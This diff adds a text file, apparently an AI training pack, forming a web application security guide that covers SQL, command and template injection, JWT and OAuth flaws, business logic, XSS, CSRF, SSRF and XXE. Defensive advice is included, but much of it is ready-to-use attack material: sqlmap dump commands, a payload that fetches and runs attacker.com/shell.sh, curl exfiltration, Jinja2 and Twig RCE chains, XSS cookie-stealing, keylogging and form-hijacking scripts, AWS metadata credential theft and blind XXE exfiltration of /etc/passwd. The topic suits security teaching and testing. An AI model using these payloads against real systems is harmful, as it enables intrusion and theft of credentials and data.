@@ -1,0 +1,526 @@
+================================================================================
+TITAN AI — TRAINING PACK 034: WEB APPLICATION SECURITY — DEEP PROFESSIONAL GUIDE
+OWASP TOP 10, INJECTION ATTACKS, AUTHENTICATION FLAWS, BUSINESS LOGIC, ADVANCED EXPLOITATION
+================================================================================
+
+================================================================================
+PART 1: INJECTION ATTACKS
+================================================================================
+
+--- SQL INJECTION — COMPLETE GUIDE ---
+
+SQL INJECTION TYPES:
+
+In-band SQLi (results visible in response):
+  Error-based: Force DB errors that reveal data in error messages.
+  Union-based: UNION with attacker's SELECT to append data to legitimate result.
+
+Blind SQLi (no data in response, infer via behavior):
+  Boolean-based: Ask true/false questions. Response changes based on answer.
+  Time-based: Use SLEEP/WAITFOR to exfiltrate bit by bit via response time.
+
+Out-of-band SQLi (data via different channel):
+  DNS exfiltration: Make DB perform DNS lookup containing extracted data.
+  HTTP request: Make DB perform HTTP call with data.
+
+UNION-BASED EXPLOITATION:
+  Vulnerable query:
+  SELECT name, price FROM products WHERE id = <USER_INPUT>
+  
+  Step 1: Determine number of columns
+  1 UNION SELECT NULL--
+  1 UNION SELECT NULL, NULL--    ← If this works: 2 columns
+  1 UNION SELECT NULL, NULL, NULL--
+  
+  Step 2: Find columns that accept strings
+  1 UNION SELECT 'a', NULL--
+  1 UNION SELECT NULL, 'a'--    ← If 'a' appears in response: 2nd column is string
+  
+  Step 3: Extract data
+  1 UNION SELECT username, password FROM users--
+  
+  Step 4: Extract all tables (MySQL)
+  1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()--
+  
+  Step 5: Extract columns of table
+  1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
+
+BOOLEAN BLIND SQLi:
+  Vulnerable: Response differs based on condition truth.
+  True: "Welcome back"   False: Nothing (no different text)
+  
+  # Is first character of admin password 'a'?
+  1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
+  
+  # Automate with custom script or sqlmap:
+  sqlmap -u "https://target.com/product?id=1" --dbms=mysql --dump --batch
+  sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --level=5 --risk=3
+
+TIME-BASED BLIND SQLi (no behavioral difference):
+  # MySQL:
+  1'; IF(1=1, SLEEP(5), 0)--    ← Response takes 5 seconds: condition is true
+  1'; IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--
+  
+  # MSSQL:
+  1'; IF(1=1) WAITFOR DELAY '0:0:5'--
+  
+  # PostgreSQL:
+  1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+
+DNS OUT-OF-BAND (MSSQL with xp_dirtree):
+  # Exfiltrate data via DNS lookup (works when no response channel available)
+  '; EXEC master..xp_dirtree '\\'+
+    (SELECT TOP 1 password FROM users WHERE username='admin')
+    +'.attacker-dns.com\share'--
+  # Attacker monitors DNS server: Sees query for <password>.attacker-dns.com
+
+SECOND-ORDER SQLi:
+  Attacker registers username: admin'--
+  Application stores it safely (parameterized INSERT).
+  Later: Application uses stored username in another (unsafe) query:
+  "SELECT * FROM settings WHERE username='" + stored_username + "'"
+  → Becomes: SELECT * FROM settings WHERE username='admin'--'
+  The injection activates on retrieval, not on storage. Often missed in tests.
+
+PARAMETERIZED QUERIES — THE ONLY TRUE FIX:
+  # Python psycopg2 (PostgreSQL):
+  cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s",
+                 (username, password))   # Never concatenate user input
+  
+  # Java PreparedStatement:
+  PreparedStatement stmt = conn.prepareStatement(
+      "SELECT * FROM users WHERE username = ? AND password = ?");
+  stmt.setString(1, username);
+  stmt.setString(2, password);
+  
+  # Node.js with pg:
+  const result = await pool.query(
+      'SELECT * FROM users WHERE username = $1 AND password = $2',
+      [username, password]
+  );
+  
+  ORM: Parameterized by default. Use ORM methods, not raw() with user input.
+
+--- COMMAND INJECTION ---
+
+PATTERNS AND PAYLOADS:
+  Vulnerable code: os.system("ping " + user_ip)
+  
+  Linux separators:
+  ; (semicolon): Execute after
+  | (pipe): Output of first to second
+  || (OR): Execute second only if first fails  
+  & (background): Run both
+  && (AND): Execute second only if first succeeds
+  `command` or $(command): Command substitution
+  \n (newline): Separate commands
+  
+  Payloads:
+  127.0.0.1; id
+  127.0.0.1; cat /etc/passwd
+  127.0.0.1 | id
+  127.0.0.1 || id
+  127.0.0.1 && id
+  127.0.0.1; wget http://attacker.com/shell.sh -O /tmp/s && bash /tmp/s
+  
+  Blind (no output): Use time delay or out-of-band
+  127.0.0.1; sleep 5
+  127.0.0.1; curl http://attacker.com/$(whoami)
+
+FILTER BYPASS:
+  Blacklist filters single characters? Use alternatives.
+  Semicolons blocked? Try newlines.
+  Spaces blocked? Use $IFS or {cmd,arg} or tabs (%09).
+  
+  # No spaces:
+  cat${IFS}/etc/passwd
+  cat</etc/passwd
+  {cat,/etc/passwd}
+  
+  # String concatenation:
+  c'a't /etc/passwd
+  c"a"t /etc/passwd
+
+--- SERVER-SIDE TEMPLATE INJECTION (SSTI) ---
+
+SSTI: Template engine processes user input as template code → code execution.
+
+DETECTION PATTERN:
+  Input: {{7*7}}
+  Output contains "49" → Template injection. 
+  Which engine?
+  
+  ${7*7}      → Java (FreeMarker, Velocity)
+  {{7*7}}     → Jinja2 (Python), Twig (PHP)
+  #{7*7}      → Smarty (PHP)
+  <%= 7*7 %>  → ERB (Ruby)
+
+JINJA2 RCE:
+  {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+  
+  # More reliable chain:
+  {{ ''.__class__.__mro__[1].__subclasses__() }}
+  # Find index of subprocess.Popen in list, then:
+  {{ ''.__class__.__mro__[1].__subclasses__()[<N>]('id', shell=True, stdout=-1).communicate() }}
+
+TWIG RCE:
+  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+================================================================================
+PART 2: AUTHENTICATION AND SESSION ATTACKS
+================================================================================
+
+--- JWT ATTACKS ---
+
+JWT STRUCTURE:
+  header.payload.signature
+  Each part: Base64URL encoded.
+  Header: {"alg": "HS256", "typ": "JWT"}
+  Payload: {"sub": "user123", "role": "user", "exp": 1735689600}
+  Signature: HMAC(header+payload, secret)
+
+ATTACK 1: Algorithm None:
+  Change "alg": "HS256" to "alg": "none"
+  Remove signature (keep trailing dot)
+  Vulnerable libraries: Accept unsigned token.
+  
+  Token: base64({"alg":"none"}).base64({"sub":"admin","role":"admin"}).
+  
+  Defense: Never accept "none" algorithm. Whitelist only expected algorithms.
+
+ATTACK 2: RS256 to HS256:
+  RS256: Asymmetric. Signed with private key. Verified with PUBLIC key.
+  If server accepts both HS256 and RS256:
+  Attacker: Get server's PUBLIC key (often exposed at /jwks.json).
+  Sign JWT with HS256 using PUBLIC KEY as HMAC secret.
+  Server (if vulnerable): Tries HS256 verification using public key as HMAC secret.
+  Matches! Token accepted.
+  
+  Defense: Strictly enforce algorithm. Never accept multiple algorithms for same endpoint.
+
+ATTACK 3: Weak secret brute-force:
+  HS256 secrets: HMAC secret. If weak (< 32 bytes or predictable):
+  hashcat -a 0 -m 16500 token.txt wordlist.txt
+  
+  Common weak secrets: "secret", "password", "jwt_secret", app name, etc.
+  Once cracked: Forge any valid token.
+
+ATTACK 4: JWT kid injection:
+  "kid" (Key ID) header: Tells server which key to use for verification.
+  Vulnerable: Server uses kid in SQL query or file path to find key.
+  
+  SQL injection via kid:
+  {"kid": "' UNION SELECT 'attacker_secret'--", "alg": "HS256"}
+  Server: SELECT key FROM jwt_keys WHERE kid = "' UNION SELECT 'attacker_secret'--"
+  Returns: "attacker_secret" as key.
+  Attacker signs token with "attacker_secret". Server verifies. Accepts.
+  
+  Path traversal via kid:
+  {"kid": "../../../dev/null", "alg": "HS256"}
+  Server reads /dev/null as key → empty key. Sign with empty string. Token accepted.
+
+--- OAUTH 2.0 ATTACKS ---
+
+OAUTH OVERVIEW:
+  Authorization Code Flow (most common for web apps):
+  1. App redirects user to: GET /authorize?client_id=X&redirect_uri=Y&state=Z&scope=A
+  2. User authenticates at authorization server, approves access.
+  3. Auth server redirects to: redirect_uri?code=AUTH_CODE&state=Z
+  4. App exchanges code: POST /token {code: AUTH_CODE, client_secret: S}
+  5. Auth server returns: access_token, refresh_token.
+
+ATTACK 1: State parameter CSRF:
+  state: Random nonce. Prevents CSRF on the callback.
+  If state missing or not validated:
+  Attacker: Starts their own OAuth flow. Gets auth code URL.
+  Trick victim: Visit that URL. Victim logs into ATTACKER's session.
+  
+  Impact: Account takeover. Victim's social account linked to attacker's account.
+
+ATTACK 2: Redirect URI manipulation:
+  Auth server should validate redirect_uri exactly.
+  Loose matching: /callback matches /callback.attacker.com?x=legitimate.com/callback
+  
+  Attack: Set redirect_uri to attacker-controlled site. Steal auth code.
+  Fix: Exact match validation of redirect_uri against pre-registered values.
+
+ATTACK 3: Authorization code reuse:
+  Auth codes: Single-use. Server must reject second use.
+  If not enforced: Steal code from logs/referrer → replay.
+
+PKCE (Proof Key for Code Exchange):
+  Prevents auth code theft in public clients (mobile apps, SPAs).
+  Client generates: code_verifier (random), code_challenge = hash(code_verifier).
+  Sends code_challenge at auth request. Sends code_verifier at token exchange.
+  If code stolen: Attacker has no code_verifier. Cannot exchange.
+
+================================================================================
+PART 3: BUSINESS LOGIC VULNERABILITIES
+================================================================================
+
+--- BUSINESS LOGIC TESTING ---
+
+Business logic flaws: Cannot be found by scanners. Require understanding of application intent.
+
+PRICE MANIPULATION:
+  E-commerce: Price of item sent from client to server?
+  Intercept: Change price to 0 or negative.
+  
+  Better but still wrong: Server uses product ID, looks up price. But allows quantity=-1.
+  quantity=-1 × price=$100 = -$100 credit applied to account.
+  
+  Defense: Server always fetches canonical price. Never trust client price. Validate quantity > 0.
+
+WORKFLOW BYPASS:
+  Multi-step process: Step 1 → Step 2 → Step 3 → Payment → Completion.
+  
+  Test: Can you skip to step 3 directly? Or go directly to completion?
+  Burp: Repeat the "completion" request from another session (session that hasn't paid).
+  
+  Defense: Validate each step was completed before allowing next. State machine enforcement.
+
+RACE CONDITIONS (business logic):
+  # Coupon code: Each code valid once.
+  # Attacker: Submit 50 simultaneous requests all using same code.
+  # If check and mark-used not atomic: Multiple succeed.
+  
+  Bash test:
+  for i in {1..50}; do
+      curl -s -b "session=user_session" \
+        -d "coupon=DISCOUNT50" \
+        https://target.com/apply_coupon &
+  done
+  wait
+  
+  Defense: Database-level unique constraint + atomic check-and-update.
+  SELECT + UPDATE in transaction with exclusive lock.
+  Or: Redis SETNX (set-if-not-exists) as distributed lock.
+
+ACCOUNT TAKEOVER VIA PASSWORD RESET:
+  Common flaws:
+  
+  Predictable reset token: Token based on username + timestamp.
+  hash(username + timestamp) → enumerate time values → forge token.
+  
+  Token not invalidated after use: Use same token multiple times.
+  
+  Long-lived token: Reset token valid for 7 days → long window for theft.
+  Best practice: Token valid for 1 hour. Invalidated on use. Invalidated on password change.
+  
+  Host header injection in reset email:
+  Server sends: "Reset at https://<HOST_HEADER>/reset?token=XYZ"
+  If trusting Host header: Send request with Host: attacker.com
+  Email sent to victim with link: https://attacker.com/reset?token=XYZ
+  Victim clicks → Attacker sees token → Resets victim's password.
+  
+  Defense: Hardcode application URL in reset emails. Never use request Host header.
+
+================================================================================
+PART 4: CLIENT-SIDE ATTACKS
+================================================================================
+
+--- XSS (CROSS-SITE SCRIPTING) ---
+
+TYPES:
+
+Reflected: Payload in request → reflected in response → executed in victim's browser.
+  URL: https://target.com/search?q=<script>alert(1)</script>
+  Response contains: <p>Results for: <script>alert(1)</script></p>
+  Victim: Clicks attacker's crafted URL → XSS fires in their browser.
+
+Stored: Payload stored in DB → served to every visitor.
+  Most dangerous. Affects all users. No need to trick each individual.
+  Example: Comment on a post with <script>payload</script>
+  Every visitor to that page: XSS fires.
+
+DOM-based: Source and sink both in JavaScript. No server-side reflection.
+  Vulnerable JS:
+  document.getElementById('results').innerHTML = location.search.split('q=')[1];
+  
+  URL: ?q=<img src=x onerror=alert(1)>
+  No server involvement. Payload never sent to server. WAF can miss this.
+  
+  Common DOM sources: location.search, location.hash, document.referrer, window.name, postMessage
+  Common DOM sinks: innerHTML, outerHTML, eval(), setTimeout(string), document.write()
+
+XSS PAYLOAD ESCALATION:
+  Cookie theft (when HttpOnly not set):
+  <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
+  
+  Keylogger:
+  <script>document.addEventListener('keydown',function(e){fetch('https://attacker.com/key?k='+e.key)})</script>
+  
+  Session hijacking (redirect to attacker's origin):
+  <script>window.location='https://attacker.com/capture?s='+encodeURIComponent(document.cookie)</script>
+  
+  Form hijacking (steal submitted credentials):
+  <script>
+  document.querySelector('form').addEventListener('submit', function(e) {
+    var data = new FormData(this);
+    fetch('https://attacker.com/creds?' + new URLSearchParams(data));
+  });
+  </script>
+
+FILTER BYPASS:
+  Quotes filtered?  <svg onload=alert(1)> (no quotes needed)
+  Script tags filtered? <img src=x onerror=alert(1)>
+  On* attributes filtered? <svg><use href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"/></svg>
+  All HTML filtered? Check if any attribute goes into existing JS:
+    var name = 'INJECTED'; → Inject: '; alert(1); //
+
+DEFENSE:
+  Content-Security-Policy (CSP):
+  Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-RANDOM_NONCE';
+  Only inline scripts with matching nonce execute. Attacker's injected scripts: Blocked.
+  
+  HTTPOnly cookies: document.cookie returns nothing → Cannot steal cookies.
+  SameSite=Strict/Lax cookies: CSRF protection built in.
+  Output encoding: HTML encode < > " ' & before inserting into HTML.
+
+--- CSRF (CROSS-SITE REQUEST FORGERY) ---
+
+MECHANISM:
+  Attacker hosts page with: <img src="https://bank.com/transfer?to=attacker&amount=1000">
+  Victim visits attacker's page while logged into bank.com.
+  Browser: Automatically sends cookies with the request.
+  Bank: Thinks it's legitimate request from logged-in user. Processes transfer.
+
+MODERN EXPLOITS:
+  GET request: Image/iframe tag sufficient.
+  POST request: JavaScript form submit:
+  <form action="https://bank.com/transfer" method="POST" id="f">
+    <input type="hidden" name="to" value="attacker">
+    <input type="hidden" name="amount" value="10000">
+  </form>
+  <script>document.getElementById('f').submit()</script>
+
+DEFENSE:
+  CSRF Tokens: Random, per-session, tied to user. Attacker cannot know token.
+  
+  SameSite Cookie Attribute:
+  SameSite=Strict: Cookie never sent cross-site. Breaks some legitimate use cases.
+  SameSite=Lax: Cookie sent on top-level navigations (GET). Not on POST cross-site.
+    Breaks POST CSRF. But: GET CSRF still possible.
+  SameSite=None: Cookie sent cross-site (requires Secure). Old behavior.
+  
+  Modern browsers: SameSite=Lax by default. Protects most CSRF scenarios without explicit token.
+  
+  Double Submit Cookie Pattern (when backend can't share state):
+  Server sets CSRF-Token cookie.
+  Client reads cookie, adds as X-CSRF-Token header.
+  Server validates: Header value matches cookie value.
+  Works because: Attacker can't read cookies from a different origin.
+
+================================================================================
+PART 5: SSRF AND XXE
+================================================================================
+
+--- SSRF (SERVER-SIDE REQUEST FORGERY) ---
+
+MECHANISM:
+  Server makes HTTP request to URL provided by user.
+  Attacker: Points to internal services, cloud metadata, localhost.
+  Server's requests: Come from trusted internal network. Bypass firewall.
+
+BASIC SSRF:
+  # Fetch internal service (bypasses firewall):
+  url=http://192.168.1.50:8080/admin
+  url=http://169.254.169.254/latest/meta-data/iam/security-credentials/  # AWS IMDS
+  url=http://localhost:6379  # Redis on same machine
+  
+  # Localhost aliases:
+  http://localhost/
+  http://127.0.0.1/
+  http://0.0.0.0/
+  http://[::1]/         # IPv6 localhost
+  http://0177.0.0.1/    # Octal
+  http://2130706433/    # Decimal IP for 127.0.0.1
+
+FILTER BYPASS:
+  IP blacklist: localhost, 127.0.0.1 blocked.
+  DNS rebinding: Attacker's domain resolves to external IP (passes check) → rebinds to 127.0.0.1.
+  Redirect: Server checks URL, follows to external. External redirects to 127.0.0.1.
+  Decimal/Octal/Hex: Different representations of 127.0.0.1.
+  URL schemes: file:// (read local files), dict://, gopher://, ftp://, ldap://
+
+GOPHER PROTOCOL SSRF (powerful):
+  Gopher can send arbitrary TCP bytes.
+  SSRF via gopher → interact with any TCP service (Redis, Memcached, SMTP).
+  
+  # Redis via gopher (write to file or execute commands):
+  gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...
+  
+  # If Redis runs as root and CONFIG SET dir/dbfilename: Write webshell to webroot.
+
+AWS SSRF → CREDENTIAL THEFT:
+  url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+  # Returns: Role name
+  
+  url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
+  # Returns: AccessKeyId, SecretAccessKey, Token
+  
+  Use credentials: Full access to AWS as that role.
+  Capital One breach (2019): SSRF → AWS IMDS → credentials → S3 access → 100M records stolen.
+
+DEFENSE:
+  - Allowlist outbound URLs (if feasible)
+  - Block all RFC 1918 addresses at egress
+  - Require IMDSv2 (mitigates SSRF → IMDS)
+  - Network segmentation: Server shouldn't reach internal services
+  - Response validation: Don't return server's response to client
+
+--- XXE (XML EXTERNAL ENTITY) ---
+
+MECHANISM:
+  XML external entities allow including external content.
+  Attacker: Define entity that reads local file or makes network request.
+  
+BASIC XXE:
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+  <userInfo><username>&xxe;</username></userInfo>
+  
+  Response includes: /etc/passwd content in username field.
+
+BLIND XXE (out-of-band):
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
+  
+  evil.dtd on attacker server:
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+  %eval;
+  %exfil;
+  
+  /etc/passwd contents sent to attacker via HTTP request.
+
+XXE TO SSRF:
+  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+  Use XXE for internal network requests. Same impact as SSRF.
+
+DEFENSE:
+  - Disable external entity processing in XML parser:
+  # Java:
+  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+  dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+  dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
+  
+  # Python lxml:
+  from lxml import etree
+  parser = etree.XMLParser(resolve_entities=False)
+  tree = etree.parse(xmlfile, parser)
+  
+  - Use JSON instead of XML where possible
+  - Update XML libraries to current versions
+
+================================================================================
+END OF PACK 034: WEB APPLICATION SECURITY
+Total: SQL injection (union/blind/time/out-of-band/second-order, full sqlmap usage,
+parameterized queries), command injection with filter bypasses, SSTI (Jinja2/Twig RCE),
+JWT attacks (alg:none/RS256-to-HS256/brute-force/kid injection), OAuth attacks
+(CSRF/redirect-URI/PKCE), business logic (price manipulation/workflow bypass/race
+conditions/password reset flaws), XSS (reflected/stored/DOM, payload escalation,
+CSP defense), CSRF (modern exploits, SameSite cookie defense), SSRF (AWS IMDS theft,
+gopher protocol, filter bypasses, Capital One breach), XXE (basic/blind/OOB/SSRF pivot,
+Java/Python parser hardening).
+================================================================================
